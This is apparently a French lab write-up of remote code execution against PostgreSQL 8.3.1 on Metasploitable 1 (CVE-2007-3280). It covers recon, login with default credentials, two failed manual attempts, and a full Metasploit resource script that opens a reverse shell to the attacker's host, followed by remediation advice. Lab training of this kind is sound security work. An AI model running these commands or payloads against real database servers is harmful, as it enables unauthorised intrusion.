# Write-up — PostgreSQL 8.3.1 : RCE via UDF partagée (Metasploitable 1, port 5432)

Cible : `192.168.56.102` · CVE-2007-3280 · Résultat : shell `postgres`.

> **Note réseau.** Je suis sur `vboxnet0` (cible `192.168.56.102`, Kali `192.168.56.1`). Côté
> coéquipier (réseau `172.28.128.x`), remplacer les IP — démarche identique.

---

## 1. Recon

🖥 Kali :
```bash
nmap -sC -sV -p 5432 192.168.56.102
```
Sortie :
```
5432/tcp open  postgresql PostgreSQL DB 8.3.0 - 8.3.7
```

## 2. Authentification avec les identifiants par défaut

🖥 Kali :
```bash
PGPASSWORD=postgres psql -h 192.168.56.102 -U postgres -c "SELECT version();"
```
```
PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
```
→ **`postgres:postgres`** fonctionne. Vérification du statut superuser, condition nécessaire
pour la suite :
```bash
PGPASSWORD=postgres psql -h 192.168.56.102 -U postgres -c "SELECT usename, usesuper FROM pg_user WHERE usename='postgres';"
```
```
 usename  | usesuper
----------+----------
 postgres | t
```

## 3. Tentative manuelle n°1 — COPY ... TO PROGRAM (ne s'applique pas)

Le parcours suggère `COPY ... TO PROGRAM` pour RCE. Test direct :
```bash
PGPASSWORD=postgres psql -h 192.168.56.102 -U postgres -c "COPY (SELECT 1) TO PROGRAM 'id';"
```
```
ERROR:  syntax error at or near "PROGRAM"
```
**Ne s'applique pas** : `COPY ... TO PROGRAM` a été introduit en PostgreSQL **9.3** (2013). La
cible tourne en 8.3.1 (2008), largement antérieure — le client ne connaît même pas cette
syntaxe. Bon exercice pour vérifier une hypothèse avant de s'y fier : une technique valable sur
une version récente ne l'est pas forcément ici.

## 4. Tentative manuelle n°2 — fonction C depuis la libc (bloquée par contre-mesure)

Technique alternative, plus ancienne, pour les PostgreSQL de cette époque : créer une fonction
SQL pointant directement vers `system()` de la libc du système.
```bash
PGPASSWORD=postgres psql -h 192.168.56.102 -U postgres -c "CREATE OR REPLACE FUNCTION sys_exec(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE C STRICT;"
```
```
ERROR:  incompatible library "/lib/libc.so.6": missing magic block
ASTUCE : Extension libraries are required to use the PG_MODULE_MAGIC macro.
```
**Bloqué également** : PostgreSQL exige depuis la 8.2 que toute bibliothèque C chargée comme
extension déclare un "magic block" (`PG_MODULE_MAGIC`) compatible avec la version du serveur —
précisément pour empêcher de charger n'importe quelle lib système (comme la libc) comme
fonction SQL. La libc brute n'a pas ce marqueur.

## 5. Identifier le vrai mécanisme (CVE + méthode qui fonctionne)

🖥 Kali — recherche du module dédié dans `msfconsole` :
```bash
msfconsole -q -x "info exploit/linux/postgres/postgres_payload; exit"
```
Sortie (extraits) :
```
Name: PostgreSQL for Linux Payload Execution
Description:
  On some default Linux installations of PostgreSQL, the
  postgres service account may write to the /tmp directory, and
  may source UDF Shared Libraries from there as well, allowing
  execution of arbitrary code.
References:
  https://nvd.nist.gov/vuln/detail/CVE-2007-3280
  https://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.txt
```
→ **CVE-2007-3280**. Le module ne charge pas une lib système quelconque (ce qui expliquait nos
deux échecs) : il **compile sa propre bibliothèque partagée**, correctement marquée avec
`PG_MODULE_MAGIC` pour la version exacte du serveur cible, l'écrit dans `/tmp` (accessible en
écriture par le compte `postgres`) via les fonctions de large objects (`lo_export`), puis la
charge comme fonction UDF pour exécuter le payload. Reproduire cette compilation à la main
(il faut les en-têtes PostgreSQL de la version exacte 8.3.1) dépasse le temps raisonnable pour
ce labo — le module fait exactement ce travail.

## 6. Exploitation — module Metasploit

🖥 Kali — resource script :
```bash
cat > /tmp/postgres.rc << 'EOF'
use exploit/linux/postgres/postgres_payload
set RHOSTS 192.168.56.102
set RPORT 5432
set USERNAME postgres
set PASSWORD postgres
set PAYLOAD linux/x86/shell/reverse_tcp
set LHOST 192.168.56.1
set LPORT 4447
exploit -z
sessions -l
sessions -i 1 -c id
sessions -i 1 -c whoami
sessions -i 1 -c "uname -a"
sessions -K
exit -y
EOF
msfconsole -q -r /tmp/postgres.rc
```
Résultat :
```
[*] 192.168.56.102:5432 - PostgreSQL 8.3.1 on i486-pc-linux-gnu, ...
[*] 192.168.56.102:5432 - Uploaded as /tmp/wltnxZOA.so, should be cleaned up automatically
[*] Sending stage (36 bytes) to 192.168.56.102
[*] Command shell session 1 opened (192.168.56.1:4447 -> 192.168.56.102:40931)
```
La ligne `Uploaded as /tmp/wltnxZOA.so` confirme exactement le mécanisme lu dans la
description du module (§5) : une `.so` compilée à la volée, déposée dans `/tmp`.

## 7. Preuve d'accès

```
sessions -i 1 -c id
uid=108(postgres) gid=117(postgres) groups=114(ssl-cert),117(postgres)

sessions -i 1 -c whoami
postgres

sessions -i 1 -c uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```
→ Shell confirmé en tant que **`postgres`**. Pas root : l'élévation de privilèges sera une
étape distincte.

---

## Remédiation

- Changer le mot de passe par défaut (`postgres:postgres`) — cause racine de l'accès initial.
- Mettre à jour PostgreSQL : la 8.3.1 (2008) est très obsolète et hors support.
- Restreindre les droits du compte système `postgres` : il ne devrait pas pouvoir écrire dans
  des répertoires partagés comme `/tmp` qui servent ensuite de point de chargement pour des
  bibliothèques UDF arbitraires (c'est le cœur de CVE-2007-3280).
- Restreindre l'accès réseau à PostgreSQL (`pg_hba.conf`, pare-feu) aux hôtes de confiance.
- Révoquer le statut superuser des comptes applicatifs dès que possible — ici `postgres`
  superuser est ce qui permet de créer des fonctions UDF arbitraires.

## Sources

- Session réelle (ce write-up) — recon, deux tentatives manuelles documentées (échecs
  expliqués), identification du mécanisme réel via `info` du module, exploitation.
- `msfconsole -q -x "info exploit/linux/postgres/postgres_payload"` → CVE-2007-3280 :
  https://nvd.nist.gov/vuln/detail/CVE-2007-3280
- Référence technique citée par le module : https://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.txt

**Suite du parcours MS1 :** AJP13 (port 8009), connecteur Tomcat — vérifier si une variante de
Ghostcat (CVE-2020-1938) s'applique (probablement pas, bon exercice similaire à cette étape).
